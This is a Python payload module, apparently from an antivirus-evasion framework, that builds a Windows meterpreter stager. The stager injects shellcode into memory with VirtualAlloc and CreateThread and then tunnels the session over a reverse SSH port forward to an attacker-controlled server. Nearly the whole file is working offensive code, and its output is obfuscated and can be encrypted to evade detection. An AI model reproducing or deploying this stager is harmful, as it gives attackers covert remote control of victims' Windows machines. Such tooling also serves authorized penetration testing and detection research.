"""
Tunnels meterpreter over SSH, code and concept by TrustedSec https://github.com/trustedsec/meterssh

Module by @byt3bl33d3r
"""

from tools.pyobfuscate import obfuscate
from modules.common import helpers
from modules.common import shellcode
from modules.common.pythonpayload import PythonPayload


class Payload(PythonPayload):

    def __init__(self):
        PythonPayload.__init__(self)

        self.description = "Injects shellcode, then tunnels over ssh"
        self.rating = "Excellent"
        self.shellcode = shellcode.Shellcode()

        self.required_options['SSH_IP'] = ["", "IP of your SSH server"]
        self.required_options['SSH_PORT'] = ["22", "Port of your SSH server"]
        self.required_options['SSH_USER'] = ["", "Username"]
        self.required_options['SSH_PASS'] = ["", "Password"]
        self.required_options['BIND_PORT'] = ["8021", "Meterpreter bind port"]

    def generate(self):
        self._validateArchitecture()

        self.shellcode.SetPayload(['windows/meterpreter/bind_tcp', ['LHOST=127.0.0.1', 'LPORT={}'.format(self.required_options['BIND_PORT'][0])]])

        Shellcode = self.shellcode.generate()

        payload = """from socket import *
import paramiko
import multiprocessing
import time
import subprocess
import ctypes
import thread
import threading
import select

def inject(shellcode):

    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(shellcode)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                       ctypes.c_int(len(shellcode)))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(shellcode)))
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

def handler(chan, host, port):
    sock = socket()
    try:
        sock.connect((host, port))

    except Exception, e:
         print e
  
    while True:
        r, w, x = select.select([sock, chan], [], [])
        if sock in r:
            data = sock.recv(1024)
            if len(data) == 0:
                break
            chan.send(data)
        if chan in r:
            data = chan.recv(1024)
            if len(data) == 0:
                break
            sock.send(data)
    chan.close()
    sock.close()

def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):

        transport.request_port_forward('', server_port)
        while True:
                chan = transport.accept(1000)
                if chan is None:
                        continue

                thr = threading.Thread(target=handler, args=(chan, remote_host, remote_port))
                thr.setDaemon(True)

                thr.start()

def main(user,password, rhost, port, bind_port):
         server = [rhost, int(port)]
         remote = ['127.0.0.1', int(bind_port)]
         client = paramiko.SSHClient()
         client.load_system_host_keys()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

         while True:
             try:
                 client.connect(server[0], server[1], username=user, key_filename=None, look_for_keys=False, password=password)
             except Exception, e:
                 pass
                 time.sleep(5)
             else:
                 break
             try:
                 reverse_forward_tunnel(bind_port, remote[0], remote[1], client.get_transport())
             except Exception, e:
                 pass
                 time.sleep(5)

if __name__ == '__main__':
    multiprocessing.freeze_support()
    shellcode = r"{0}"
    shellcode = shellcode.decode("string_escape")
    shellcode = bytearray(shellcode)
    time.sleep(2)
    p = multiprocessing.Process(target=inject, args=(shellcode,))
    jobs = []
    jobs.append(p)
    p.start()

    user = "{1}"
    password = "{2}"
    bind_port = "{3}"
    rhost = "{4}"
    port = "{5}"
    time.sleep(3)
    thread.start_new_thread(main,(user, password, rhost, port, bind_port,))""".format(Shellcode,
                                                                                      self.required_options['SSH_USER'][0],
                                                                                      self.required_options['SSH_PASS'][0],
                                                                                      self.required_options['BIND_PORT'][0], 
                                                                                      self.required_options['SSH_IP'][0],
                                                                                      self.required_options['SSH_PORT'][0])

        payloadCode = obfuscate(payload)

        if self.required_options["use_pyherion"][0].lower() == "y":
            payloadCode = encryption.pyherion(payloadCode)

        return payloadCode